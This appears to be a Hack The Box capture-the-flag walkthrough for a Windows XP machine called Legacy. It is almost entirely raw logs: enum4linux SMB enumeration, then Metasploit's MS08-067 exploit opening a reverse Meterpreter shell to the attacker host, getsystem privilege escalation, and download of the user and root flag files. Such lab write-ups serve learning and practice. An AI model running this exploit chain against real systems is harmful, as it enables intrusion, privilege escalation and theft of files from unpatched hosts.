### Enumeration

```
kaipowered@debian:~/Downloads/enum4linux-0.8.9/enum4linux-0.8.9$ sudo ./enum4linux.pl -a 10.10.10.4
[sudo] password for kaipowered: 
WARNING: ldapsearch is not in your path.  Check that package is installed and your PATH is sane.
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Jul 18 22:42:06 2017

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.10.4
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ================================================== 
|    Enumerating Workgroup/Domain on 10.10.10.4    |
 ================================================== 
[+] Got domain/workgroup name: HTB

 ========================================== 
|    Nbtstat Information for 10.10.10.4    |
 ========================================== 
Looking up status of 10.10.10.4
	LEGACY          <00> -         B <ACTIVE>  Workstation Service
	HTB             <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	LEGACY          <20> -         B <ACTIVE>  File Server Service
	HTB             <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
	HTB             <1d> -         B <ACTIVE>  Master Browser
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser

	MAC Address = 00-50-56-97-0E-E1

 =================================== 
|    Session Check on 10.10.10.4    |
 =================================== 
[+] Server 10.10.10.4 allows sessions using username '', password ''

 ========================================= 
|    Getting domain SID for 10.10.10.4    |
 ========================================= 
could not initialise lsa pipe. Error was NT_STATUS_ACCESS_DENIED
could not obtain sid from server
error: NT_STATUS_ACCESS_DENIED
[+] Can't determine if host is part of domain or part of a workgroup

 ==================================== 
|    OS information on 10.10.10.4    |
 ==================================== 
[+] Got OS info for 10.10.10.4 from smbclient: Domain=[LEGACY] OS=[Windows 5.1] Server=[Windows 2000 LAN Manager]
[E] Can't get OS info with srvinfo: NT_STATUS_ACCESS_DENIED

 =========================== 
|    Users on 10.10.10.4    |
 =========================== 
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED

[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED

 ======================================= 
|    Share Enumeration on 10.10.10.4    |
 ======================================= 
[E] Can't list shares: NT_STATUS_ACCESS_DENIED

[+] Attempting to map shares on 10.10.10.4

 ================================================== 
|    Password Policy Information for 10.10.10.4    |
 ================================================== 
[E] Unexpected error from polenum.py:
Traceback (most recent call last):
  File "/usr/local/bin/polenum.py", line 32, in <module>
    from impacket import uuid
ImportError: No module named impacket
[E] Failed to get password policy with rpcclient


 ============================ 
|    Groups on 10.10.10.4    |
 ============================ 

[+] Getting builtin groups:
[E] Can't get builtin groups: NT_STATUS_ACCESS_DENIED

[+] Getting builtin group memberships:

[+] Getting local groups:
[E] Can't get local groups: NT_STATUS_ACCESS_DENIED

[+] Getting local group memberships:

[+] Getting domain groups:
[E] Can't get domain groups: NT_STATUS_ACCESS_DENIED

[+] Getting domain group memberships:

 ===================================================================== 
|    Users on 10.10.10.4 via RID cycling (RIDS: 500-550,1000-1050)    |
 ===================================================================== 
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.

 =========================================== 
|    Getting printer info for 10.10.10.4    |
 =========================================== 
could not initialise lsa pipe. Error was NT_STATUS_ACCESS_DENIED
could not obtain sid from server
error: NT_STATUS_ACCESS_DENIED


enum4linux complete on Tue Jul 18 22:42:49 2017

```

### Exploitation

```
msf exploit(ms06_040_netapi) > use exploit/windows/smb/ms08_067_netapi
msf exploit(ms08_067_netapi) > show options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST                     yes       The target address
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting


msf exploit(ms08_067_netapi) > set RHOST 10.10.10.4
RHOST => 10.10.10.4
msf exploit(ms08_067_netapi) > run

[*] Started reverse TCP handler on 10.10.15.172:4444 
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (956991 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.15.172:4444 -> 10.10.10.4:1028) at 2017-07-18 22:26:33 +0800

meterpreter > sysinfo
Computer        : LEGACY
OS              : Windows XP (Build 2600, Service Pack 3).
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > whoami
[-] Unknown command: whoami.
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > shell
Process 1512 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>cd c:\Users
cd c:\Users
The system cannot find the path specified.

C:\WINDOWS\system32>cd C 
cd C
The system cannot find the path specified.

C:\WINDOWS\system32>cd C:\
cd C:\

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\

16/03/2017  08:30 ��                 0 AUTOEXEC.BAT
16/03/2017  08:30 ��                 0 CONFIG.SYS
16/03/2017  09:07 ��    <DIR>          Documents and Settings
16/03/2017  08:33 ��    <DIR>          Program Files
16/03/2017  08:33 ��    <DIR>          WINDOWS
               2 File(s)              0 bytes
               3 Dir(s)   6.488.408.064 bytes free

C:\>cd WINDOWS
cd WINDOWS

C:\WINDOWS>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\WINDOWS

16/03/2017  08:33 ��    <DIR>          .
16/03/2017  08:33 ��    <DIR>          ..
23/07/2017  07:19 ��                 0 0.log
16/03/2017  08:18 ��    <DIR>          addins
16/03/2017  08:19 ��    <DIR>          AppPatch
23/08/2001  03:00 ��             1.272 Blue Lace 16.bmp
23/08/2001  03:00 ��            82.944 clock.avi
16/03/2017  08:27 ��               200 cmsetacl.log
23/08/2001  03:00 ��            17.062 Coffee Bean.bmp
16/03/2017  08:32 ��            15.905 comsetup.log
16/03/2017  08:18 ��    <DIR>          Config
16/03/2017  08:18 ��    <DIR>          Connection Wizard
16/03/2017  08:30 ��                 0 control.ini
16/03/2017  08:28 ��    <DIR>          Cursors
16/03/2017  08:20 ��    <DIR>          Debug
23/08/2001  03:00 ��                 2 desktop.ini
16/03/2017  08:18 ��    <DIR>          Driver Cache
16/03/2017  08:28 ��               130 DtcInstall.log
16/03/2017  08:19 ��    <DIR>          ehome
14/04/2008  06:42 ��         1.033.728 explorer.exe
23/08/2001  03:00 ��                80 explorer.scf
16/03/2017  08:29 ��            11.537 FaxSetup.log
23/08/2001  03:00 ��            16.730 FeatherTexture.bmp
23/08/2001  03:00 ��            17.336 Gone Fishing.bmp
23/08/2001  03:00 ��            26.582 Greenstone.bmp
16/03/2017  08:29 ��    <DIR>          Help
14/04/2008  06:42 ��            10.752 hh.exe
16/03/2017  08:32 ��            48.335 iis6.log
16/03/2017  08:30 ��    <DIR>          ime
16/03/2017  08:32 ��             4.382 imsins.log
16/03/2017  08:18 ��    <DIR>          java
16/03/2017  08:19 ��    <DIR>          L2Schemas
16/03/2017  08:29 ��             1.487 MedCtrOC.log
16/03/2017  08:19 ��    <DIR>          Media
16/03/2017  08:19 ��    <DIR>          msagent
16/03/2017  08:18 ��    <DIR>          msapps
23/08/2001  03:00 ��             1.405 msdfmap.ini
16/03/2017  08:29 ��               871 msgsocm.log
16/03/2017  08:28 ��            10.066 msmqinst.log
16/03/2017  08:19 ��    <DIR>          mui
16/03/2017  08:29 ��             2.790 netfxocm.log
16/03/2017  08:19 ��    <DIR>          Network Diagnostic
14/04/2008  06:42 ��            69.120 NOTEPAD.EXE
16/03/2017  08:32 ��             7.948 ntdtcsetup.log
16/03/2017  08:29 ��            14.772 ocgen.log
16/03/2017  08:32 ��               885 ocmsn.log
16/03/2017  08:30 ��             4.161 ODBCINST.INI
16/03/2017  09:07 ��             1.178 OEWABLog.txt
16/03/2017  08:29 ��    <DIR>          Offline Web Pages
16/03/2017  08:29 ��    <DIR>          pchealth
16/03/2017  08:19 ��    <DIR>          PeerNet
23/08/2001  03:00 ��            65.954 Prairie Wind.bmp
16/03/2017  09:18 ��    <DIR>          Prefetch
16/03/2017  08:18 ��    <DIR>          Provisioning
14/04/2008  06:42 ��           146.432 regedit.exe
16/03/2017  08:30 ��    <DIR>          Registration
16/03/2017  08:32 ��             8.192 REGLOCS.OLD
16/03/2017  08:24 ��             1.690 regopt.log
16/03/2017  08:18 ��    <DIR>          repair
16/03/2017  08:18 ��    <DIR>          Resources
23/08/2001  03:00 ��            17.362 Rhododendron.bmp
23/08/2001  03:00 ��            26.680 River Sumida.bmp
23/08/2001  03:00 ��            65.832 Santa Fe Stucco.bmp
11/05/2017  01:31 ��             1.306 SchedLgU.Txt
16/03/2017  08:30 ��    <DIR>          security
16/03/2017  08:29 ��             1.022 sessmgr.setup.log
14/04/2008  08:40 ��         1.296.669 SET3.tmp
14/04/2008  08:34 ��         1.088.840 SET4.tmp
14/04/2008  08:34 ��            16.535 SET8.tmp
16/03/2017  08:32 ��           159.934 setupact.log
11/05/2017  01:31 ��           196.252 setupapi.log
16/03/2017  08:20 ��                 0 setuperr.log
16/03/2017  08:33 ��           747.894 setuplog.txt
23/08/2001  03:00 ��            65.978 Soap Bubbles.bmp
16/03/2017  08:33 ��    <DIR>          SoftwareDistribution
16/03/2017  08:29 ��    <DIR>          srchasst
16/03/2017  08:22 ��                 0 Sti_Trace.log
16/03/2017  08:20 ��    <DIR>          system
16/03/2017  08:20 ��               231 system.ini
23/07/2017  07:23 ��    <DIR>          system32
16/03/2017  08:32 ��             1.252 tabletoc.log
23/08/2001  03:00 ��            15.360 TASKMAN.EXE
11/05/2017  01:30 ��    <DIR>          Temp
16/03/2017  08:32 ��            10.801 tsoc.log
23/08/2001  03:00 ��            94.784 twain.dll
16/03/2017  08:18 ��    <DIR>          twain_32
14/04/2008  06:42 ��            50.688 twain_32.dll
23/08/2001  03:00 ��            49.680 twunk_16.exe
23/08/2001  03:00 ��            25.600 twunk_32.exe
16/03/2017  08:28 ��                36 vb.ini
16/03/2017  08:28 ��                37 vbaddin.ini
23/08/2001  03:00 ��            18.944 vmmreg32.dll
16/03/2017  08:29 ��    <DIR>          Web
16/03/2017  08:22 ��               501 wiadebug.log
16/03/2017  08:22 ��                49 wiaservc.log
16/03/2017  08:30 ��               477 win.ini
23/07/2017  07:24 ��            11.076 WindowsUpdate.log
23/08/2001  03:00 ��           256.192 winhelp.exe
14/04/2008  06:42 ��           283.648 winhlp32.exe
16/03/2017  08:20 ��    <DIR>          WinSxS
16/03/2017  09:07 ��             1.107 wmsetup.log
16/03/2017  08:30 ��           316.640 WMSysPr9.prx
23/08/2001  03:00 ��             9.522 Zapotec.bmp
23/08/2001  03:00 ��               707 _default.pif
              68 File(s)      6.455.564 bytes
              36 Dir(s)   6.488.403.968 bytes free

C:\WINDOWS>dir system
dir system
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\WINDOWS\system

16/03/2017  08:20 ��    <DIR>          .
16/03/2017  08:20 ��    <DIR>          ..
23/08/2001  03:00 ��            69.584 AVICAP.DLL
23/08/2001  03:00 ��           109.456 AVIFILE.DLL
23/08/2001  03:00 ��            32.816 COMMDLG.DLL
23/08/2001  03:00 ��             2.000 KEYBOARD.DRV
23/08/2001  03:00 ��             9.936 LZEXPAND.DLL
23/08/2001  03:00 ��            73.376 MCIAVI.DRV
23/08/2001  03:00 ��            25.264 MCISEQ.DRV
23/08/2001  03:00 ��            28.160 MCIWAVE.DRV
13/04/2008  11:24 ��            68.768 MMSYSTEM.DLL
23/08/2001  03:00 ��             1.152 MMTASK.TSK
23/08/2001  03:00 ��             2.032 MOUSE.DRV
23/08/2001  03:00 ��           126.912 MSVIDEO.DLL
23/08/2001  03:00 ��            82.944 OLECLI.DLL
23/08/2001  03:00 ��            24.064 OLESVR.DLL
23/08/2001  03:00 ��            59.167 setup.inf
23/08/2001  03:00 ��             5.120 SHELL.DLL
23/08/2001  03:00 ��             1.744 SOUND.DRV
23/08/2001  03:00 ��             5.532 stdole.tlb
23/08/2001  03:00 ��             3.360 SYSTEM.DRV
23/08/2001  03:00 ��            19.200 TAPI.DLL
23/08/2001  03:00 ��             4.048 TIMER.DRV
23/08/2001  03:00 ��             9.008 VER.DLL
23/08/2001  03:00 ��             2.176 VGA.DRV
23/08/2001  03:00 ��            13.600 WFWNET.DRV
14/04/2008  06:42 ��           146.432 WINSPOOL.DRV
              25 File(s)        925.851 bytes
               2 Dir(s)   6.488.403.968 bytes free

C:\WINDOWS>dir ehome
dir ehome
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\WINDOWS\ehome

16/03/2017  08:19 ��    <DIR>          .
16/03/2017  08:19 ��    <DIR>          ..
14/04/2008  06:41 ��            33.792 custsat.dll
               1 File(s)         33.792 bytes
               2 Dir(s)   6.488.403.968 bytes free

C:\WINDOWS>dir temp
dir temp
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\WINDOWS\temp

11/05/2017  01:30 ��    <DIR>          .
11/05/2017  01:30 ��    <DIR>          ..
               0 File(s)              0 bytes
               2 Dir(s)   6.488.395.776 bytes free

C:\WINDOWS>cd ..
cd ..

C:\>cd "Documents and Settings"
cd "Documents and Settings"

C:\Documents and Settings>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings

16/03/2017  09:07 ��    <DIR>          .
16/03/2017  09:07 ��    <DIR>          ..
16/03/2017  09:07 ��    <DIR>          Administrator
16/03/2017  08:29 ��    <DIR>          All Users
16/03/2017  08:33 ��    <DIR>          john
               0 File(s)              0 bytes
               5 Dir(s)   6.488.395.776 bytes free

C:\Documents and Settings>cd john 
cd john

C:\Documents and Settings\john>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\john

16/03/2017  08:33 ��    <DIR>          .
16/03/2017  08:33 ��    <DIR>          ..
16/03/2017  09:19 ��    <DIR>          Desktop
16/03/2017  08:33 ��    <DIR>          Favorites
16/03/2017  08:33 ��    <DIR>          My Documents
16/03/2017  08:20 ��    <DIR>          Start Menu
               0 File(s)              0 bytes
               6 Dir(s)   6.488.395.776 bytes free

C:\Documents and Settings\john>cd Desktop
cd Desktop

C:\Documents and Settings\john\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\john\Desktop

16/03/2017  09:19 ��    <DIR>          .
16/03/2017  09:19 ��    <DIR>          ..
16/03/2017  09:19 ��                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)   6.488.395.776 bytes free

C:\Documents and Settings\john\Desktop>edit user.txt
edit user.txt
^C
Terminate channel 1? [y/N]  y
meterpreter > pwd
C:\WINDOWS\system32
meterpreter > cd C:\Documents and Settings\john\Desktop
[-] stdapi_fs_chdir: Operation failed: The system cannot find the file specified.
meterpreter > cd C:
meterpreter > pwd
C:\WINDOWS\system32
meterpreter > lpwd
/home/kaipowered/Documents/HTB
meterpreter > cd C:\
meterpreter > pwd
C:\
meterpreter > cd "Documents and Settings"
meterpreter > pwd
C:\Documents and Settings
meterpreter > cd john
meterpreter > cd Desktop
meterpreter > download user.txt
[*] Downloading: user.txt -> user.txt
[*] Downloaded 32.00 B of 32.00 B (100.0%): user.txt -> user.txt
[*] download   : user.txt -> user.txt
meterpreter > pwd
C:\Documents and Settings\john\Desktop
meterpreter > cd ..
meterpreter > cd ..
meterpreter > pwd
C:\Documents and Settings
meterpreter > dir
Listing: C:\Documents and Settings
==================================

Mode             Size  Type  Last modified              Name
----             ----  ----  -------------              ----
40777/rwxrwxrwx  0     dir   2017-03-16 14:07:21 +0800  Administrator
40777/rwxrwxrwx  0     dir   2017-03-16 13:29:48 +0800  All Users
40777/rwxrwxrwx  0     dir   2017-03-16 13:33:37 +0800  Default User
40777/rwxrwxrwx  0     dir   2017-03-16 13:32:52 +0800  LocalService
40777/rwxrwxrwx  0     dir   2017-03-16 13:32:43 +0800  NetworkService
40777/rwxrwxrwx  0     dir   2017-03-16 13:33:42 +0800  john

meterpreter > cd Administrator
meterpreter > dir
Listing: C:\Documents and Settings\Administrator
================================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
40555/r-xr-xr-x   0       dir   2017-03-16 14:07:29 +0800  Application Data
40777/rwxrwxrwx   0       dir   2017-03-16 13:32:27 +0800  Cookies
40777/rwxrwxrwx   0       dir   2017-03-16 14:18:27 +0800  Desktop
40555/r-xr-xr-x   0       dir   2017-03-16 14:07:32 +0800  Favorites
40777/rwxrwxrwx   0       dir   2017-03-16 13:20:48 +0800  Local Settings
40555/r-xr-xr-x   0       dir   2017-03-16 14:07:31 +0800  My Documents
100666/rw-rw-rw-  524288  fil   2017-05-11 06:31:16 +0800  NTUSER.DAT
100666/rw-rw-rw-  1024    fil   2017-07-24 00:18:53 +0800  NTUSER.DAT.LOG
40777/rwxrwxrwx   0       dir   2017-03-16 13:20:48 +0800  NetHood
40777/rwxrwxrwx   0       dir   2017-03-16 13:20:48 +0800  PrintHood
40555/r-xr-xr-x   0       dir   2017-03-16 14:07:31 +0800  Recent
40555/r-xr-xr-x   0       dir   2017-03-16 14:07:24 +0800  SendTo
40555/r-xr-xr-x   0       dir   2017-03-16 13:20:48 +0800  Start Menu
40777/rwxrwxrwx   0       dir   2017-03-16 13:28:41 +0800  Templates
100666/rw-rw-rw-  178     fil   2017-05-11 06:31:16 +0800  ntuser.ini

meterpreter > cd Desktop
meterpreter > dir
Listing: C:\Documents and Settings\Administrator\Desktop
========================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  32    fil   2017-03-16 14:18:50 +0800  root.txt

meterpreter > download root.txt
[*] Downloading: root.txt -> root.txt
[*] Downloaded 32.00 B of 32.00 B (100.0%): root.txt -> root.txt
[*] download   : root.txt -> root.txt
meterpreter >
```



